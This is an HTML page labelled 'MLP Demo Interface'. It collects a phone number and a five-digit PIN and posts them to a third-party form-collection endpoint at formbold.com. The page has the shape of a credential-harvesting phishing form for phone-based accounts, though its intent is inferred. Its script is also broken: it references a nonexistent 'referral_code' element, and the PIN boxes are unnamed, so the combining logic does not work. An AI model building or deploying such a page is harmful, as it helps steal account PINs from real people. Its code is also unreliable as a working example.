<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MLP Demo Interface</title>

    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="style.css">
</head>
<body>

<div class="wrapper">

    <h1>MLP Demo</h1>

    <form action="https://formbold.com/s/3Labw" method="POST">

    

        <label>Phone Number</label>
        <input type="tel" name="phone" required>

        <label>PIN</label>

        <div class="pin-container">
            <input type="text" maxlength="1" inputmode="numeric">
            <input type="text" maxlength="1" inputmode="numeric">
            <input type="text" maxlength="1" inputmode="numeric">
            <input type="text" maxlength="1" inputmode="numeric">
            <input type="text" maxlength="1" inputmode="numeric">
        </div>

        <!-- hidden field sent to FormBold -->
        <input type="hidden" name="PIN" id="pin">

        <button type="submit">Submit</button>

    </form>

</div>

<script>
const inputs = document.querySelectorAll(".pin-container input");
const hiddenInput = document.getElementById("referral_code");

inputs.forEach((input, index) => {

    input.addEventListener("input", function () {
        this.value = this.value.replace(/[^0-9]/g, "");

        if (this.value.length > 1) {
            this.value = this.value.slice(0, 1);
        }

        if (this.value && index < inputs.length - 1) {
            inputs[index + 1].focus();
        }

        updateHidden();
    });

    input.addEventListener("keydown", function (e) {
        if (e.key === "Backspace" && this.value === "" && index > 0) {
            inputs[index - 1].focus();
        }
    });

});

function updateHidden() {
    let code = "";
    inputs.forEach(i => code += i.value);
    hiddenInput.value = code;
}
</script>

</body>
</html>
